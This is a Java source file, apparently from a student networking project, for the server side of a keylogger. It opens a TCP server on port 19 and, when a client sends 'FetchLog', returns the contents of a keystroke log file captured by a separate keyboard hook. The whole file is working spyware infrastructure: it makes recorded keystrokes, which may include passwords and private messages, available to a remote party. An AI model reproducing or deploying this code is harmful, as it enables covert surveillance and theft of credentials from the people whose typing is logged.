package com.hao.damang;

import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;

public class KeyLoggerServer extends JFrame{
	static String filePath = "E:/Dai Hoc/Do an/Do an Mang/Source code/HookKeyboard/Debug/KeyLog.txt";
	static FileManager fileReader = new FileManager(filePath);
	private static JLabel notifyLabel = null;
	
	public KeyLoggerServer() {
		setupFrame();
	}
	
	private void setupFrame() {
		setSize(500, 400);
		setTitle("Key logger - Server");
		
		JPanel panel = new JPanel(new BorderLayout());
		JPanel subPanel = new JPanel(new FlowLayout());
		
		notifyLabel = new JLabel();
		
		subPanel.add(notifyLabel);
		
		panel.add(subPanel);
		getContentPane().add(panel);
		
		setDefaultCloseOperation(EXIT_ON_CLOSE);
		setVisible(true);
	}

	public static void main(String[] args) {
		new KeyLoggerServer();
		
		int port = 19;
		ServerSocket ssocket = null;
		try {
			ssocket = new ServerSocket(port);
			System.out.println("Server started at port " + port);
			updateMessage("Server started at port " + port);
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		
		while (true) {
			try {			
				Socket cSocket = ssocket.accept();
				System.out.println("Client connected to server.");
				// get streams
				DataInputStream din = new DataInputStream(cSocket.getInputStream());
				DataOutputStream dout = new DataOutputStream(cSocket.getOutputStream());

				// get request
				while (true) {
					String request = din.readUTF();
					System.out.println("Request: " + request);
					// response
					if (request.equals("FetchLog")) {
						String response = getLog();
						dout.writeUTF(response);
					}
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

	}

	private static void updateMessage(String msg) {
		notifyLabel.setText(msg);
	}

	private static String getLog() {
		String fileContent = fileReader.read();
		return fileContent;
	}
}
